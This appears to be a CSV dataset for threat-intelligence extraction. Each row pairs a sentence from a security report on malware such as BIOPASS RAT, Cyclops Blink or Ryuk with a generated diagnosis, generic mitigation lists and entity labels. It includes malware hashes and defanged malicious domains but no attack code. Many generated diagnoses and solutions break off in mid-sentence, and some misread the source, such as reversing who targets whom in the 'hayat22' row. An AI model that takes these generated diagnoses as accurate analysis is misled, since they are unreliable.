3315,"although these are not implemented inside the biopass rat malware, we have observed two additional plug-ins that are written in python (“getwechatdb” and “xss_spoof”) and were deployed by the threat actor to a victim who had been infected with cobalt strike.","the threat actor used the biopass rat malware to deploy two additional plug-ins written in python (""getwechatdb"" and ""xss_spoof"") as tools to a victim who had been infected with cobalt strike software.","1. implementing a multi-layered defense system that includes anti-virus software, firewalls, and intrusion detection and prevention systems to detect and block the initial cobalt strike infection. 2. conducting regular security audits and vulnerability assessments to identify and address weaknesses in the organization's it infrastructure that could be exploited by attackers. 3. implementing strict access controls and user authentication protocols to prevent unauthorized access to sensitive data and systems. 4. educating employees on cybersecurity best practices, such as avoiding suspicious",malware,SOFTWARE,tools
3394,biopass rat loader backdoor.win64.biopass.a 5fd2da648068f75a4a66b08d6d93793f735be62ae88085a79d839b6a0d6d859a flash1.exe biopass rat loader backdoor.win64.biopass.a 660cef8210f823acb0b31d78fbce1d6f3f8c4f43231286f7ac69f75b2c42c020 flashplayerpp_install_cn.exe,"the diagnosis is that the entity ""flash1.exe"" and ""flashplayerpp_install_cn.exe"" are both infected with the malware backdoor.win64.biopass.a, as indicated by the corresponding hash values. both files were likely infected by",1. install and regularly update reputable antivirus software to detect and remove malware like backdoor.win64.biopass.a. 2. implement firewalls to block unauthorized access to systems and prevent the spread of malware. 3. conduct regular system scans and vulnerability assessments to identify and address potential security weaknesses. 4. educate employees on safe browsing habits and the risks of downloading and installing software from untrusted sources. 5. implement access controls to limit the ability of unauthorized users to modify or execute files on,malware,hash,malware
3799,"while chessmaster still uses the previous exploit, it also added more methods to its arsenal: one exploits another vulnerability, cve-2017-11882 (patched in november 2017), which was also exploited to deliver illegal versions of the loki infostealer.","the entity chessmaster is using a previously known exploit and has added new methods to its arsenal, including exploiting another vulnerability (cve-2017-11882) to deliver illegal versions of the loki infostealer. this indicates a malware attack that exploits",1. regularly update and patch all software and operating systems to prevent exploitation of known vulnerabilities. 2. implement endpoint protection solutions such as antivirus and anti-malware software to detect and prevent the execution of malicious code. 3. use network segmentation and firewalls to limit access to sensitive data and prevent lateral movement of malware. 4. conduct regular security awareness training for employees to prevent social engineering attacks that can lead to malware infections. 5. implement intrusion detection and prevention systems (idps) to detect,malware,TIME,vulnerability
3350,"while these connections allow us to link the malware to the winnti group, the different targets between biopass rat and the current operations by winnti’s that we are tracking makes associating the two more difficult.",difficulty in associating biopass rat with winnti group due to different targets.,1. conduct a thorough analysis of the malware's code and behavior to identify any similarities or patterns that may link it to the winnti group. 2. utilize advanced threat intelligence tools and techniques to identify any connections or overlaps between the targets of biopass rat and those of the winnti group. 3. implement network segmentation and access controls to limit the potential impact of a biopass rat infection and prevent lateral movement within the network. 4. conduct regular security audits and vulnerability assessments,threat-actor,malware,threat-actor
5438,"while the cyclops blink malware variant that we analyzed in this report is complicated in nature, one thing proves to be unmistakable when it comes to the sandworm group that created it: sandworm is a persistent and sophisticated group whose motives are clearly at odds with those that would be expected from groups that are primarily financially motivated.","diagnosis: the sandworm group is attributed to the creation of the cyclops blink malware variant, which is a persistent and sophisticated threat. their motives appear to be at odds with financial gain, indicating a potential state-sponsored or politically motivated cyber attack.","1. implement advanced threat detection and response systems to identify and mitigate the cyclops blink malware variant. 2. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the organization's security posture. 3. implement multi-factor authentication and access controls to prevent unauthorized access to sensitive data and systems. 4. establish a comprehensive incident response plan to enable quick and effective response to cyber attacks. 5. train employees on cybersecurity best practices, including identifying and reporting suspicious activity and phishing attempts. 6.",threat-actor,malware,threat-actor
3401,biopass rat loader backdoor.win64.biopass.a 8445c0189735766edf0e3d01b91f6f98563fef272ac5c92d3701a1174ad072dd silverlight_ins.exe biopass rat loader backdoor.win64.biopass.a 89c0b2036ce8d1d91f6d8b8171219aafcd6237c811770fa16edf922cedfecc54 mtywoti1mzeznq==.exe biopass rat loader backdoor.,"the diagnosis is that the entity silverlight_ins.exe and mtywoti1mzeznq==.exe are infected with the biopass rat loader backdoor.win64.biopass.a malware, as indicated by the",1. install and regularly update antivirus software to detect and remove the biopass rat loader backdoor.win64.biopass.a malware. 2. use a firewall to block unauthorized access to the network and prevent the malware from communicating with its command and control server. 3. implement strict access controls and authentication mechanisms to prevent unauthorized users from accessing sensitive data and systems. 4. conduct regular security assessments and penetration testing to identify and address vulnerabilities in the network and systems. 5. train employees on safe,malware,hash,malware
3363,.python.biopass.a 34be85754a84cc44e5bb752ee3a95e2832e7be1f611dd99e9a1233c812a6dad2 c1222.txt biopass rat python script (c1222 module) trojan,the diagnosis is that a trojan malware named biopass rat has been detected in a python script (c1222 module) with the hash value 34be85754a84cc44e5bb752ee3a95e2832e,1. use antivirus software to scan and remove the biopass rat malware from the python script. 2. implement a strong password policy to prevent unauthorized access to the system. 3. implement a network segmentation strategy to isolate critical systems and prevent lateral movement of malware. 4. use intrusion detection and prevention systems to detect and block any attempts to exploit vulnerabilities in the system. 5. implement regular software updates and patches to mitigate known vulnerabilities that can be exploited by malware. 6. use file integrity monitoring tools,hash,malware,malware
573,"ryuk will change the infected file extension to .ryk, and leave a ransom note called ryukreadme.html.",the entity with id 44784 (filepath) is indicated to be infected with the malware ryuk (id 44783) through the relationship with id 22 (indicates). the malware will change the file extension to .ryk and,1. implement regular antivirus scans and updates to detect and remove ryuk malware from infected systems. 2. use firewalls and intrusion detection/prevention systems to monitor network traffic and block suspicious activity. 3. conduct regular vulnerability assessments to identify and address potential weaknesses in the system that could be exploited by malware like ryuk. 4. implement access controls and authentication protocols to limit access to sensitive data and prevent unauthorized access by malware. 5. backup important data regularly and store it in a secure location to ensure,malware,FILEPATH,
3698,fin7 utilizes guardrails to restrict execution and abused utilities that allow indirect command execution that can go past security restrictions.,"the diagnosis is that fin7, a threat actor, is utilizing tools to restrict execution and abuse utilities that allow indirect command execution to go past security restrictions. this is evidenced by the relationship between fin7 and the tools and attack pattern, as they are",1. implementing a robust endpoint detection and response (edr) solution that can detect and block the use of these tools by fin7. 2. deploying a network intrusion detection system (nids) that can monitor network traffic and alert security teams to any suspicious activity related to fin7. 3. conducting regular vulnerability assessments and patching any known vulnerabilities in systems and applications that could be exploited by fin7. 4. implementing a security information and event management (siem) solution,attack-pattern,threat-actor,tools
13715,"it is associated with the cyberespionage group blacktech, which mainly targets technology companies and government agencies in east asia (specifically taiwan, and in some instances, japan and hong kong) and is responsible for some infamous campaigns such as plead and shrouded crossbow.","the diagnosis is cyberespionage by the blacktech threat actor group targeting technology companies and government agencies in east asia, specifically taiwan, japan, and hong kong. the group is responsible for infamous campaigns such as plead and shrouded crossbow",1. implementing multi-factor authentication for all employees and contractors accessing sensitive information. 2. regularly conducting vulnerability assessments and penetration testing to identify and address any potential weaknesses in the organization's security infrastructure. 3. deploying advanced threat detection and response tools to monitor network traffic and identify any suspicious activity. 4. creating and enforcing strict access controls and permissions for sensitive data and systems. 5. providing regular cybersecurity training and awareness programs for all employees to ensure they are aware of the latest threats and best practices,threat-actor,location,location
952,not all apps that use the taomike library steal sms messages.,"possible diagnosis: the entity identified as ""identity"" is using an app that has the potential to steal sms messages, but not all apps that use the taomike library have this capability. the relationship between the ""identity"" entity and the ""attack","1. implement a mobile device management (mdm) solution to monitor and control app installations on corporate devices. 2. conduct regular security assessments of all apps used within the organization to identify potential vulnerabilities. 3. educate employees on the risks of downloading and using unverified apps, especially those that request access to sensitive information such as sms messages. 4. use endpoint detection and response (edr) solutions to detect and respond to any suspicious activity on corporate devices. 5. implement two-factor authentication (",identity,attack-pattern,
3628,"for example, a spear phishing attack could use email messages about military exercises sent to military or government targets like we saw with our recent research into cmstar trojan attacks.",diagnosis: cmstar trojan attack entity: military or government targets relationship: malware uses spear phishing attack pattern,1. implementing a strong email security system that can detect and block spear phishing attacks. 2. regularly conducting cybersecurity awareness training for employees to help them identify and avoid phishing emails. 3. installing and regularly updating anti-virus and anti-malware software on all devices. 4. implementing two-factor authentication for all sensitive accounts and systems. 5. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network. 6. encrypting sensitive data to prevent unauthorized access,attack-pattern,malware,
3858,"after the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is bkdr_anel.","the entity (identified by id 49721) is infected with the malware bkdr_anel, which was downloaded by event.dll (identified by id 49718) from the file path ssssss.ddd (identified by id 49720",1. implementing strong anti-malware software that can detect and remove bkdr_anel and other similar malware. 2. blocking the file path ssssss.ddd and preventing any downloads from this location. 3. conducting regular vulnerability assessments and patching any identified vulnerabilities in the system to prevent malware attacks. 4. implementing strict access controls and limiting user privileges to prevent unauthorized downloads and installations of malware. 5. conducting regular security awareness training for employees to educate them on the risks,FILEPATH,FILEPATH,FILEPATH
1278,"three of the backdoors, nflog, poisonivy, and newct have previously been publicly associated with dragonok.","dragonok is the threat actor responsible for the use of the backdoors nflog, poisonivy, and newct, which have been associated with malware.",1. implementing network segmentation to prevent lateral movement of malware 2. conducting regular vulnerability assessments and patching vulnerable systems 3. deploying advanced endpoint protection solutions that can detect and prevent the use of backdoors 4. implementing multi-factor authentication to prevent unauthorized access to sensitive systems 5. conducting regular security awareness training for employees to prevent social engineering attacks 6. implementing intrusion detection and prevention systems to detect and block malicious traffic 7. conducting regular penetration testing to,malware,malware,malware
4277,the dropped payloads are modified versions of the remote administration tool quasarrat that can be traced to the domains sastind-cn[.]org and tautiaos[.]com.,the entity is likely a computer system or network that has been infected with a modified version of the remote administration tool quasarrat. the relationship between the entity and the cybersecurity issue is that the entity communicates with the malicious domains sastind-cn[,"1. install and regularly update antivirus software to detect and remove quasarrat and other malware. 2. implement network segmentation to limit the spread of malware within the network. 3. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the network. 4. implement a firewall to block traffic to known malicious domains and ip addresses. 5. use intrusion detection and prevention systems to detect and prevent unauthorized access to the network. 6. train employees on cybersecurity best practices, such as avoiding",url,malware,url
1277,"during analysis of this threat, we identified five additional backdoor tools hosted on biosnews[.]info which may be downloaded by the sysget variants once the attackers have established a foothold.","malware infection on the entity biosnews[.]info via a backdoor tool, with a relationship to the sysget variants that download the additional tools once a foothold has been established.",1. install and regularly update anti-virus and anti-malware software to detect and remove any malicious programs. 2. implement a firewall to prevent unauthorized access to the system and block any suspicious incoming traffic. 3. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the system. 4. use strong passwords and two-factor authentication to prevent unauthorized access to sensitive information. 5. educate employees on cybersecurity best practices and the risks associated with clicking on links or downloading attachments from unknown,url,malware,
4564,follina is a remote code execution (rce) vulnerability in the microsoft windows support diagnostic tool (msdt).,"follina vulnerability exists in software entity through a ""has"" relationship.",1. implement regular vulnerability scans and penetration testing to identify and address any follina vulnerabilities in the software entity. 2. implement access controls and authentication mechanisms to prevent unauthorized access to the software entity and mitigate the risk of exploitation of the follina vulnerability. 3. implement secure coding practices and conduct regular code reviews to identify and address any follina vulnerabilities in the software entity. 4. implement software patches and updates to address any known follina vulnerabilities in the software entity. 5. implement,vulnerability,SOFTWARE,
13026,"however, for the first time, tag has observed coldriver campaigns targeting the military of multiple eastern european countries, as well as a nato centre of excellence.",diagnosis: the cybersecurity issue is a coldriver campaign targeting the military of multiple eastern european countries and a nato centre of excellence. the entity being targeted is the military and the nato centre of excellence. the relationship between the entities is that the military,"1. network segmentation: the military and the nato centre of excellence should be segmented into different networks to prevent the spread of malware from one network to another. 2. endpoint protection: implement endpoint protection solutions, such as antivirus software, firewalls, and intrusion detection systems, to prevent malware infections and unauthorized access to sensitive information. 3. employee training: conduct regular cybersecurity awareness training sessions for military personnel and nato centre of excellence employees to educate them about the risks associated with phishing emails and other social engineering",campaign,identity,identity
3736,timeline for vmware vulnerabilities cve-2022-22954 in the wild direct downloads mirai/gafgyt dropper scripts or variants webshells perl shellbot base64 injections ssh key targeting cve-2022-22960 in the wild conclusion indicators of compromise,"the diagnosis is a cybersecurity incident involving the exploitation of two vulnerabilities in vmware (cve-2022-22954 and cve-2022-22960) by malware (mirai/gafgyt dropper scripts or variants, webshells,",1. patch management: regularly update and patch the software and systems to prevent vulnerabilities from being exploited. 2. network segmentation: isolate critical systems and sensitive data from the rest of the network to prevent lateral movement and limit the impact of a potential attack. 3. access control: implement strong access controls to limit the number of users who have access to sensitive systems and data. 4. intrusion detection and prevention systems: deploy ids/ips systems to detect and prevent malicious activity on the network,vulnerability,malware,malware
1254,"dragonok has previously targeted japanese high-tech and manufacturing firms, but we’ve identified a new backdoor malware, named “formerfirstrat,” deployed by these attackers.","dragonok is the threat actor that has authored the malware ""formerfirstrat"" and is targeting japanese high-tech and manufacturing firms. the diagnosis is a targeted cyber attack using a backdoor malware.",1. implement strong network segmentation to prevent lateral movement of the malware within the organization. 2. deploy advanced threat detection and response solutions to detect and respond to the attack in real-time. 3. conduct regular vulnerability assessments and patch management to prevent exploitation of known vulnerabilities. 4. implement multi-factor authentication and access controls to prevent unauthorized access to critical systems and data. 5. train employees on cybersecurity best practices and awareness to prevent social engineering attacks.,threat-actor,malware,identity
2801,"while the initial attack vector for these attacks is unknown, it is certain that the spread of the ransomware occurs through active exploitation of the eternalblue vulnerability (cve-2017-0144) in microsoft windows.","diagnosis: the entity software is affected by the vulnerability cve-2017-0144 in microsoft windows, which is actively exploited to spread ransomware.",1. install the latest security patches and updates for microsoft windows to address the vulnerability cve-2017-0144. 2. implement a robust backup and recovery system to ensure that critical data can be restored in case of a ransomware attack. 3. deploy anti-malware and anti-ransomware software to detect and block malicious software from infecting the system. 4. implement network segmentation to limit the spread of ransomware in case of an attack. 5. train employees on how to identify,vulnerability,SOFTWARE,vulnerability
2613,"although the commodity malware redline stealer has been implicated for credential harvesting in some attacks, it’s unclear if this is first- or third-party, and it cannot be used as a definitive indicator of lapsus$-specific activity.",unclear attribution diagnosis.,1. implementing advanced threat intelligence tools and techniques to identify and track malicious actors. 2. conducting thorough investigations to gather as much information as possible about the sources of attacks. 3. utilizing machine learning algorithms to identify patterns and anomalies in network traffic that may indicate a cyber attack. 4. implementing multi-factor authentication and access controls to prevent unauthorized access to sensitive data and systems. 5. developing and implementing incident response plans to quickly and effectively respond to cyber attacks. 6. regularly conducting,malware,attack-pattern,threat-actor
1283,figure 7. relationship between five additional backdoors used by dragonok and their c2 servers in this campaign.,diagnosis: the cybersecurity issue is the use of backdoors by the threat actor known as dragonok. the entity involved is the infrastructure used by dragonok for their command and control (c2) servers. the relationship between the entities is that dragon,1. implementing strict access controls and authentication mechanisms to prevent unauthorized access to the infrastructure used by dragonok for their command and control (c2) servers. 2. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities in the infrastructure. 3. deploying intrusion detection and prevention systems (idps) to detect and prevent any attempts by dragonok to use backdoors to gain access to the infrastructure. 4. implementing network segmentation to isolate critical systems from the rest of,threat-actor,Infrastucture,
13651,we first noticed the campaign from a large group of email domains used in phishing attempts.,phishing campaign using a large group of email domains is indicative of an attack pattern targeting the entity.,"1. implement a multi-factor authentication system to prevent unauthorized access to sensitive information. 2. train employees to identify and report suspicious emails, and conduct regular phishing simulations to increase awareness. 3. use email filtering and anti-spam software to block suspicious emails from reaching employees' inboxes. 4. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the organization's cybersecurity defenses. 5. implement a security information and event management (siem) system to monitor network activity and detect potential",attack-pattern,campaign,
3336,the main script used to manipulate traffic with windivert potential links with the winnti group,possible diagnosis: the winnti group may be using the windivert tool to manipulate network traffic for malicious purposes. the relationship between the threat actor and the tool is that the former uses the latter. this suggests that the winnti group has,1. implement network segmentation to limit the spread of any potential malicious traffic. 2. install and configure network monitoring tools to detect any suspicious network activity. 3. utilize intrusion detection and prevention systems to block any malicious traffic coming from the windivert tool. 4. conduct regular security assessments and vulnerability scans to identify any potential security gaps in the network. 5. implement access controls and enforce strong password policies to prevent unauthorized access to the network. 6. educate employees on cybersecurity best practices to prevent,threat-actor,tools,
3465,"here’s a summary of blackgear’s latest campaign: use a decoy document or fake installer file, sent via spam email to lure a potential victim into clicking it.",diagnosis: blackgear is using a spam email campaign to distribute a decoy document or fake installer file. the attack pattern involves luring potential victims into clicking on the file. the entity responsible for the campaign is blackgear. the relationship between the,potential cybersecurity solutions: 1. email filtering: implementing an email filtering system can help detect and block spam emails from reaching the intended recipients. this can prevent potential victims from being lured into clicking on malicious links or downloading fake installer files. 2. anti-malware software: installing anti-malware software on all devices can help detect and remove any malicious files that may have been downloaded. this can prevent the installation of malware on the system and protect against any potential data breaches. 3.,campaign,attack-pattern,attack-pattern
13657,the attackers use cloud-based email distribution services like sendgrid to deliver emails with a clickable link that redirects targets to a fake office 365 page.,phishing attack using cloud-based email distribution services like sendgrid to deliver emails with a clickable link that redirects targets to a fake office 365 page. the threat actor uses the sendgrid tool to send the phishing emails.,"1. implement strong email security measures, such as dkim, spf, and dmarc, to prevent spoofing and phishing attacks. 2. use multi-factor authentication for all cloud-based services, including office 365, to prevent unauthorized access. 3. train employees on how to identify and report phishing emails and provide regular cybersecurity awareness training. 4. use advanced threat intelligence solutions to detect and block phishing emails before they reach employees' inboxes. 5. monitor suspicious activity on cloud-based email distribution services",threat-actor,tools,
1850,"after disabling the security products, the actors behind avoslocker again tried to transfer other tools, namely mimikatz and impacket.","possible diagnosis: the cybersecurity issue involves a malware attack, specifically the avoslocker ransomware. the actors behind the attack attempted to transfer other tools, namely mimikatz and impacket, after disabling security products. the entities involved include the malware,",1. implement a robust antivirus and anti-malware software that can detect and prevent the avoslocker ransomware from infecting the system. 2. conduct regular security audits to identify any security vulnerabilities that could be exploited by cybercriminals. 3. use intrusion detection and prevention systems to monitor network traffic and detect any suspicious activity. 4. implement a strong password policy and multi-factor authentication to prevent unauthorized access to the system. 5. regularly backup critical data to ensure that it can be restored,tools,malware,tools
13552,"taken together, this led us to believe that water pamola places orders with this embedded xss script across many targeted online shops.","water pamola is conducting a campaign of placing orders with an embedded xss script on targeted online shops. this campaign is utilizing an attack pattern, indicating a potential cyber attack.","1. implement strict input validation and sanitization on online shop websites to prevent xss attacks. 2. use web application firewalls (wafs) to detect and block malicious traffic. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential security weaknesses. 4. educate employees and customers on cybersecurity best practices, such as avoiding clicking on suspicious links or downloading unknown files. 5. monitor network traffic and system logs for unusual activity and immediately investigate any suspicious behavior.",campaign,attack-pattern,
1373,"stage1.exe purports to be ransomware, as it overwrites the target’s master boot record with 512 bytes and upon reboot displays the following ransom note: stage2.exe is a beaconing implant that performs an https connection to download a jpg file hosted on discord’s content delivery network (cdn).",the diagnosis is a coordinated ransomware attack. stage1.exe is the initial ransomware that infects the target's system and overwrites the master boot record. stage2.exe is a beaconing implant that establishes a connection to an external infrastructure hosted on,1. regularly back up critical data and store it offline to prevent data loss in case of a ransomware attack. 2. implement strong access controls and multi-factor authentication to prevent unauthorized access to the system. 3. use anti-malware software and keep it updated to detect and prevent ransomware attacks. 4. conduct regular security audits and vulnerability assessments to identify and address any weaknesses in the system. 5. implement network segmentation to limit the spread of ransomware within the network. 6. train,FILEPATH,Infrastucture,FILEPATH
5482,"hayat22, supposedly a female student, engaged in an online romance with a target whose handle was love, describing himself as living in south asia working in garments manufacturing and wholesaling.","possible diagnosis: social engineering scam explanation: the cybersecurity issue is a potential social engineering scam, where the target (handle ""love"") may be attempting to gain the trust of the entity (hayat22) in order to obtain personal information or money",1. implement employee training programs that educate employees on how to identify and avoid social engineering scams. 2. use multi-factor authentication to prevent unauthorized access to sensitive information or accounts. 3. implement email filtering and spam detection tools to prevent phishing emails from reaching employees. 4. implement strict access controls to limit access to sensitive information only to authorized personnel. 5. regularly monitor and analyze network traffic to detect any suspicious activity and prevent data exfiltration.,identity,location,identity
3412,biopass rat loader backdoor.win64.biopass.a bf4f50979b7b29f2b6d192630b8d7b76adb9cb65157a1c70924a47bf519c4edd test.exe,"the entity ""test.exe"" has been infected with the malware backdoor.win64.biopass.a, which is identified by the hash value ""bf4f50979b7b29f2b6d192630b8d7",1. use antivirus software to detect and remove the malware from the infected entity. 2. implement a firewall to prevent unauthorized access to the entity and block any suspicious activity. 3. conduct regular vulnerability assessments and penetration testing to identify any weaknesses in the system and address them promptly. 4. educate employees on safe browsing habits and the importance of not downloading or opening suspicious files or emails. 5. implement multi-factor authentication to prevent unauthorized access to sensitive data and systems. 6. use encryption to protect sensitive,malware,hash,malware
5279,"cyclops blink, an advanced modular botnet that is reportedly linked to the sandworm or voodoo bear advanced persistent threat (apt) group, has recently been used to target watchguard firebox devices according to an analysis performed by the uk’s national cyber security centre (ncsc).","diagnosis: watchguard firebox devices have been targeted by the cyclops blink botnet, which is linked to either the sandworm or voodoo bear apt group, according to analysis by the uk's ncsc. the threat actors behind this",1. update watchguard firebox devices with the latest security patches and firmware to mitigate vulnerabilities exploited by the cyclops blink botnet. 2. implement network segmentation and access control measures to limit the spread of the botnet and prevent lateral movement within the network. 3. deploy intrusion detection and prevention systems (idps) to detect and block malicious traffic associated with the sandworm or voodoo bear apt group. 4. conduct regular security assessments and penetration testing to identify and remediate any weaknesses in,malware,threat-actor,threat-actor
1543,"sofacy group has been associated with many attacks against targets around the world, including the international olympic committee (ioc) in 2018, the world anti-doping agency in 2016, the dutch safety board in 2015, and german, french, ukrainian, and dutch political and military targets throughout 2014 through 2018.","the diagnosis is that sofacy group is a threat actor responsible for multiple cyber attacks against various targets around the world, including political and military entities, as well as organizations involved in sports and anti-doping efforts. the attacks have occurred over several years and","1. implementing a comprehensive threat intelligence program that continuously monitors for any signs of sofacy group activity and provides real-time alerts to security teams. 2. deploying advanced endpoint detection and response (edr) solutions that can detect and mitigate any suspicious activity on endpoints, including those that are not connected to the corporate network. 3. conducting regular security awareness training for employees to educate them on the latest cyber threats and how to identify and report any suspicious activity. 4. implementing a robust security",location,location,location
13595,the plugin has been designed to drop multiple php web shell files on the server.,the infrastructure of the system has been targeted by an attack pattern involving the use of a plugin that drops multiple php web shell files on the server.,1. regularly update and patch the system and plugins to ensure that vulnerabilities are addressed promptly. 2. implement access controls and permissions to limit the number of users who can install plugins and modify system files. 3. use antivirus software to scan for and detect malicious files on the server. 4. implement intrusion detection and prevention systems to identify and block attacks before they can cause damage. 5. conduct regular security audits and penetration testing to identify vulnerabilities and address them promptly. 6. educate employees on safe,Infrastucture,attack-pattern,
2368,"we have uncovered a cyberespionage campaign being perpetrated by earth baku, an advanced persistent threat (apt) group with a known history of carrying out cyberattacks under the alias apt41.","diagnosis: earth baku, a known apt group operating under the alias apt41, is carrying out a cyberespionage campaign. the relationship between the entity earth baku and the entity apt41 is a duplicate relationship, indicating that",1. implementing strong network segmentation and access controls to limit the lateral movement of earth baku or apt41 within the network. 2. deploying advanced threat detection and response tools that can identify and mitigate the activities of apt groups like apt41. 3. conducting regular security assessments and penetration testing to identify and address vulnerabilities that could be exploited by apt groups. 4. enhancing employee awareness and training on cybersecurity best practices to prevent social engineering attacks that could be used by a,threat-actor,threat-actor,
14267,"based on the analysis of samples that were last seen in the wild in march 2018, the maikspy variant (detected by trend micro as androidos_maikspy.hrx) that runs on android poses as virtual girlfriend to lure users into visiting the attackers’ malicious domain.","the diagnosis is that the maikspy variant is a malware that targets android devices and disguises itself as a virtual girlfriend app. the malware lures users into visiting the attackers' malicious domain, posing a serious threat to the identity and security of the","1. educate users about the risks of downloading apps from untrusted sources and encourage them to only download apps from reputable app stores. 2. implement security measures on android devices such as firewalls, anti-virus software, and intrusion detection systems. 3. regularly update android devices with the latest security patches and software updates. 4. monitor network traffic for suspicious activity and block traffic to known malicious domains. 5. use machine learning and artificial intelligence algorithms to detect and prevent malware attacks. 6.",malware,SOFTWARE,identity
